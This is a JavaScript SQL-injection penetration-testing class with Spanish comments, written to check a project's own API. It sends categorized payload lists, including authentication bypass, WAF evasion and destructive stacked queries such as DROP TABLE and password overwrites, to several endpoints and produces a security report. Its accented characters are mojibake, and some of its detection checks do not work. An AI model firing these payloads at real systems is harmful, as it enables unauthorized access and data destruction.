/**
 * Herramientas de Testing de Penetraci√≥n SQL
 * Proyecto: Compareware - Desarrollo Backend
 * Prop√≥sito: Scripts para probar la seguridad contra inyecciones SQL (SOLO PARA TESTING PROPIO)
 * 
 * ‚ö†Ô∏è  ADVERTENCIA: 
 * Estas herramientas son √öNICAMENTE para probar TU PROPIO SISTEMA.
 * Usar estas t√©cnicas en sistemas que no te pertenecen es ILEGAL.
 * Solo para prop√≥sitos educativos y testing de tu propia aplicaci√≥n.
 */

const axios = require('axios');
const fs = require('fs');
const path = require('path');

class SQLInjectionPenTester {
  constructor(baseURL) {
    this.baseURL = baseURL;
    this.testResults = [];
    this.successfulAttacks = [];
    this.blockedAttempts = [];

    // Payloads de testing organizados por t√©cnica
    this.testPayloads = {
      // 1. Union-based SQL Injection
      unionBased: [
        "' UNION SELECT 1,2,3--",
        "' UNION SELECT null,null,null--",
        "' UNION SELECT username,password,1 FROM users--",
        "1 UNION SELECT 1,2,3",
        "1' UNION SELECT table_name,null,null FROM information_schema.tables--",
        "' UNION SELECT column_name,1,2 FROM information_schema.columns--",
        "admin' UNION SELECT 1,database(),version()--"
      ],

      // 2. Boolean-based Blind SQL Injection
      booleanBlind: [
        "1 AND 1=1",
        "1 AND 1=2", 
        "admin' AND '1'='1",
        "admin' AND '1'='2",
        "1' AND LENGTH(database())>5--",
        "1' AND SUBSTRING(database(),1,1)='c'--",
        "1' AND ASCII(SUBSTRING(database(),1,1))>99--",
        "admin' AND (SELECT COUNT(*) FROM users)>0--"
      ],

      // 3. Time-based Blind SQL Injection
      timeBlind: [
        "1; WAITFOR DELAY '00:00:05'--",
        "1' AND SLEEP(5)--",
        "1'; SELECT PG_SLEEP(5)--",
        "admin' AND IF(1=1,SLEEP(5),0)--",
        "1' AND (SELECT SLEEP(5) FROM users WHERE username='admin')--",
        "'; IF (1=1) WAITFOR DELAY '00:00:03'--"
      ],

      // 4. Error-based SQL Injection
      errorBased: [
        "1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))--",
        "1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user()),0x7e),1)--",
        "1' AND EXP(~(SELECT * FROM (SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a))--",
        "1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
      ],

      // 5. Stacked Queries
      stackedQueries: [
        "1; DROP TABLE test_table--",
        "1'; INSERT INTO users VALUES ('hacker','password')--",
        "admin'; UPDATE users SET password='hacked'--",
        "1; CREATE TABLE hacked (id INT)--",
        "1'; SELECT * FROM users; SELECT 'hacked'--"
      ],

      // 6. Bypass Techniques
      bypassTechniques: [
        "1/**/UNION/**/SELECT/**/1,2,3--",
        "1' UNI/**/ON SE/**/LECT 1,2,3--",
        "1' /*!UNION*/ SELECT 1,2,3--",
        "1'/*comment*/UNION/*comment*/SELECT/*comment*/1,2,3--",
        "1' %55NION %53ELECT 1,2,3--", // URL encoding
        "1' UNION(SELECT(1),2,3)--",
        "1'+UNION+SELECT+1,2,3--",
        "1' UNION\tSELECT\n1,2,3--", // Alternative whitespace
      ],

      // 7. Authentication Bypass
      authBypass: [
        "admin'--",
        "admin'/*",
        "admin' OR '1'='1'--",
        "admin' OR 1=1--",
        "' OR ''='",
        "' OR 1--'",
        "' OR 'a'='a",
        "') OR ('1'='1'--",
        "admin') OR ('1'='1'--",
        "anything' OR 'x'='x"
      ],

      // 8. Information Gathering
      infoGathering: [
        "1' AND 1=2 UNION SELECT table_name,null FROM information_schema.tables--",
        "1' UNION SELECT column_name,data_type FROM information_schema.columns WHERE table_name='users'--",
        "1' UNION SELECT database(),user()--",
        "1' UNION SELECT version(),@@datadir--",
        "1' UNION SELECT schema_name,null FROM information_schema.schemata--"
      ]
    };

    // Headers para simular diferentes herramientas
    this.userAgents = [
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
      'sqlmap/1.4.7#stable (http://sqlmap.org)',
      'Nikto/2.1.6',
      'Burp/1.7.37',
      'python-requests/2.25.1'
    ];
  }

  /**
   * Ejecutar suite completa de tests
   */
  async runFullPenTest() {
    console.log('üîç INICIANDO PENETRATION TEST DE SQL INJECTION');
    console.log('‚ö†Ô∏è  Solo para testing del propio sistema - Uso responsable');
    console.log('==========================================\n');

    this.testResults = [];
    this.successfulAttacks = [];
    this.blockedAttempts = [];

    // Test cada categor√≠a de ataques
    for (const [category, payloads] of Object.entries(this.testPayloads)) {
      console.log(`\nüìä Testing ${category.toUpperCase()}...`);
      
      for (let i = 0; i < payloads.length; i++) {
        const payload = payloads[i];
        
        try {
          const result = await this.testPayload(payload, category, i);
          this.testResults.push(result);
          
          // Delay entre requests para no sobrecargar
          await this.delay(100);
          
        } catch (error) {
          console.error(`‚ùå Error testing payload: ${error.message}`);
        }
      }
    }

    // Generar reporte final
    this.generateReport();
  }

  /**
   * Probar un payload espec√≠fico
   */
  async testPayload(payload, category, index) {
    const testId = `${category}_${index}`;
    const userAgent = this.userAgents[Math.floor(Math.random() * this.userAgents.length)];
    
    console.log(`  Testing: ${payload.substring(0, 50)}...`);

    const testResult = {
      id: testId,
      category: category,
      payload: payload,
      timestamp: new Date().toISOString(),
      userAgent: userAgent,
      results: []
    };

    // Test en diferentes endpoints
    const endpoints = [
      '/api/users', 
      '/api/login', 
      '/api/search',
      '/api/perifericos',
      '/api/comparaciones'
    ];

    for (const endpoint of endpoints) {
      const result = await this.testEndpoint(endpoint, payload, userAgent);
      testResult.results.push({
        endpoint: endpoint,
        ...result
      });
    }

    return testResult;
  }

  /**
   * Probar payload en un endpoint espec√≠fico
   */
  async testEndpoint(endpoint, payload, userAgent) {
    const startTime = Date.now();
    
    try {
      // Test en query parameters
      const queryResult = await this.testQueryParams(endpoint, payload, userAgent);
      
      // Test en POST body
      const bodyResult = await this.testPostBody(endpoint, payload, userAgent);
      
      const endTime = Date.now();
      const responseTime = endTime - startTime;

      return {
        queryTest: queryResult,
        bodyTest: bodyResult,
        responseTime: responseTime,
        success: queryResult.vulnerable || bodyResult.vulnerable
      };

    } catch (error) {
      return {
        error: error.message,
        success: false,
        responseTime: Date.now() - startTime
      };
    }
  }

  /**
   * Test en query parameters
   */
  async testQueryParams(endpoint, payload, userAgent) {
    try {
      const response = await axios.get(`${this.baseURL}${endpoint}`, {
        params: {
          id: payload,
          search: payload,
          filter: payload
        },
        headers: {
          'User-Agent': userAgent
        },
        timeout: 10000,
        validateStatus: () => true // No throw en status codes
      });

      return this.analyzeResponse(response, payload, 'query');
      
    } catch (error) {
      if (error.code === 'ECONNABORTED') {
        return {
          vulnerable: true,
          type: 'TIME_BASED_BLIND',
          evidence: 'Request timeout - possible time-based injection',
          status: 'TIMEOUT'
        };
      }
      
      return {
        vulnerable: false,
        error: error.message,
        status: 'ERROR'
      };
    }
  }

  /**
   * Test en POST body
   */
  async testPostBody(endpoint, payload, userAgent) {
    try {
      const response = await axios.post(`${this.baseURL}${endpoint}`, {
        username: payload,
        password: payload,
        email: payload,
        nombre: payload,
        descripcion: payload
      }, {
        headers: {
          'User-Agent': userAgent,
          'Content-Type': 'application/json'
        },
        timeout: 10000,
        validateStatus: () => true
      });

      return this.analyzeResponse(response, payload, 'body');
      
    } catch (error) {
      if (error.code === 'ECONNABORTED') {
        return {
          vulnerable: true,
          type: 'TIME_BASED_BLIND',
          evidence: 'Request timeout - possible time-based injection',
          status: 'TIMEOUT'
        };
      }
      
      return {
        vulnerable: false,
        error: error.message,
        status: 'ERROR'
      };
    }
  }

  /**
   * Analizar respuesta para detectar vulnerabilidades
   */
  analyzeResponse(response, payload, source) {
    const analysis = {
      vulnerable: false,
      type: null,
      evidence: null,
      status: response.status,
      responseTime: null,
      headers: response.headers,
      bodyLength: response.data ? JSON.stringify(response.data).length : 0
    };

    // 1. Verificar errores de base de datos en la respuesta
    const errorPatterns = [
      /mysql_fetch_array/i,
      /ORA-\d{5}/i,
      /Microsoft.*ODBC.*SQL Server/i,
      /PostgreSQL.*ERROR/i,
      /Warning.*mysql_/i,
      /valid MySQL result/i,
      /MySqlClient\./i,
      /Unknown column/i,
      /syntax error/i,
      /SQL syntax.*MySQL/i
    ];

    const responseText = JSON.stringify(response.data || '');
    
    for (const pattern of errorPatterns) {
      if (pattern.test(responseText)) {
        analysis.vulnerable = true;
        analysis.type = 'ERROR_BASED';
        analysis.evidence = `Database error detected: ${pattern.source}`;
        this.successfulAttacks.push({payload, source, response: response.status});
        break;
      }
    }

    // 2. Verificar respuestas an√≥malas (posible boolean-based blind)
    if (response.status === 200 && payload.includes('1=1')) {
      analysis.type = 'POSSIBLE_BOOLEAN_BLIND';
      analysis.evidence = 'Different response for true condition';
    }

    // 3. Verificar si fue bloqueado por WAF
    if (response.status === 403 || response.status === 406 || 
        (response.data && JSON.stringify(response.data).includes('blocked'))) {
      analysis.blocked = true;
      analysis.evidence = 'Request blocked by security system';
      this.blockedAttempts.push({payload, source, status: response.status});
    }

    // 4. Verificar tiempo de respuesta an√≥malo (time-based blind)
    if (response.responseTime > 5000) {
      analysis.vulnerable = true;
      analysis.type = 'TIME_BASED_BLIND';
      analysis.evidence = `Slow response time: ${response.responseTime}ms`;
    }

    return analysis;
  }

  /**
   * Generar reporte de penetration test
   */
  generateReport() {
    const report = {
      testSuite: 'SQL Injection Penetration Test',
      timestamp: new Date().toISOString(),
      target: this.baseURL,
      summary: {
        totalTests: this.testResults.length,
        vulnerablePayloads: this.successfulAttacks.length,
        blockedAttempts: this.blockedAttempts.length,
        securityScore: 0
      },
      categories: {},
      recommendations: [],
      detailedResults: this.testResults
    };

    // Analizar por categor√≠as
    for (const result of this.testResults) {
      if (!report.categories[result.category]) {
        report.categories[result.category] = {
          tested: 0,
          vulnerable: 0,
          blocked: 0
        };
      }

      const cat = report.categories[result.category];
      cat.tested++;

      const hasVulnerable = result.results.some(r => 
        r.queryTest?.vulnerable || r.bodyTest?.vulnerable
      );
      
      const hasBlocked = result.results.some(r => 
        r.queryTest?.blocked || r.bodyTest?.blocked
      );

      if (hasVulnerable) cat.vulnerable++;
      if (hasBlocked) cat.blocked++;
    }

    // Calcular score de seguridad (0-100, m√°s alto = m√°s seguro)
    const totalVulnerabilities = this.successfulAttacks.length;
    const totalBlocked = this.blockedAttempts.length;
    const totalTests = this.testResults.length;
    
    report.summary.securityScore = Math.max(0, 
      100 - (totalVulnerabilities * 10) + (totalBlocked * 5)
    );

    // Generar recomendaciones
    this.generateRecommendations(report);

    // Guardar reporte
    this.saveReport(report);

    // Mostrar resumen en consola
    this.displaySummary(report);

    return report;
  }

  /**
   * Generar recomendaciones de seguridad
   */
  generateRecommendations(report) {
    const recs = [];

    if (report.summary.vulnerablePayloads > 0) {
      recs.push('üö® CR√çTICO: Se detectaron vulnerabilidades de SQL injection');
      recs.push('‚úÖ Implementar prepared statements en todas las consultas');
      recs.push('‚úÖ Validar y sanitizar todas las entradas de usuario');
      recs.push('‚úÖ Usar whitelist de caracteres permitidos');
    }

    if (report.summary.blockedAttempts > 50) {
      recs.push('‚úÖ Excelente: WAF est√° bloqueando efectivamente los ataques');
    } else if (report.summary.blockedAttempts > 0) {
      recs.push('‚ö†Ô∏è  Mejorar: Algunos ataques no fueron bloqueados por el WAF');
      recs.push('‚úÖ Revisar configuraci√≥n del Web Application Firewall');
    } else {
      recs.push('üö® CR√çTICO: No hay protecci√≥n WAF activa');
      recs.push('‚úÖ Implementar Web Application Firewall inmediatamente');
    }

    if (report.categories.unionBased?.vulnerable > 0) {
      recs.push('‚úÖ Implementar detecci√≥n espec√≠fica de ataques UNION');
    }

    if (report.categories.timeBlind?.vulnerable > 0) {
      recs.push('‚úÖ Configurar timeouts estrictos en consultas de BD');
    }

    if (report.categories.authBypass?.vulnerable > 0) {
      recs.push('üö® CR√çTICO: Bypass de autenticaci√≥n detectado');
      recs.push('‚úÖ Revisar inmediatamente la l√≥gica de autenticaci√≥n');
    }

    report.recommendations = recs;
  }

  /**
   * Guardar reporte en archivo
   */
  saveReport(report) {
    const filename = `pentest_report_${new Date().toISOString().replace(/[:.]/g, '-')}.json`;
    const filepath = path.join(__dirname, '../logs', filename);

    try {
      fs.writeFileSync(filepath, JSON.stringify(report, null, 2));
      console.log(`\nüìÑ Reporte guardado: ${filepath}`);
    } catch (error) {
      console.error('Error guardando reporte:', error.message);
    }
  }

  /**
   * Mostrar resumen en consola
   */
  displaySummary(report) {
    console.log('\n' + '='.repeat(60));
    console.log('üìä RESUMEN DEL PENETRATION TEST');
    console.log('='.repeat(60));
    
    console.log(`üéØ Target: ${report.target}`);
    console.log(`‚è∞ Timestamp: ${report.timestamp}`);
    console.log(`üß™ Tests ejecutados: ${report.summary.totalTests}`);
    console.log(`üö® Vulnerabilidades encontradas: ${report.summary.vulnerablePayloads}`);
    console.log(`üõ°Ô∏è  Ataques bloqueados: ${report.summary.blockedAttempts}`);
    console.log(`üìä Score de seguridad: ${report.summary.securityScore}/100`);

    console.log('\nüìà AN√ÅLISIS POR CATEGOR√çA:');
    for (const [category, stats] of Object.entries(report.categories)) {
      const percentage = stats.tested > 0 ? 
        Math.round((stats.blocked / stats.tested) * 100) : 0;
      
      console.log(`  ${category}: ${stats.vulnerable} vulnerables, ${stats.blocked} bloqueados (${percentage}%)`);
    }

    console.log('\nüí° RECOMENDACIONES PRINCIPALES:');
    report.recommendations.slice(0, 5).forEach(rec => {
      console.log(`  ${rec}`);
    });

    // Determinar nivel de seguridad
    let securityLevel = '';
    if (report.summary.securityScore >= 90) {
      securityLevel = 'üü¢ EXCELENTE';
    } else if (report.summary.securityScore >= 70) {
      securityLevel = 'üü° BUENO';
    } else if (report.summary.securityScore >= 50) {
      securityLevel = 'üü† NECESITA MEJORAS';
    } else {
      securityLevel = 'üî¥ CR√çTICO';
    }

    console.log(`\nüéØ NIVEL DE SEGURIDAD: ${securityLevel}`);
    console.log('='.repeat(60));
  }

  /**
   * Delay helper
   */
  delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }

  /**
   * Test r√°pido de un endpoint espec√≠fico
   */
  async quickTest(endpoint, payload) {
    console.log(`üîç Quick test: ${endpoint} con payload: ${payload}`);
    
    const result = await this.testEndpoint(endpoint, payload, this.userAgents[0]);
    
    console.log('Resultado:', result);
    return result;
  }
}

module.exports = {
  SQLInjectionPenTester
};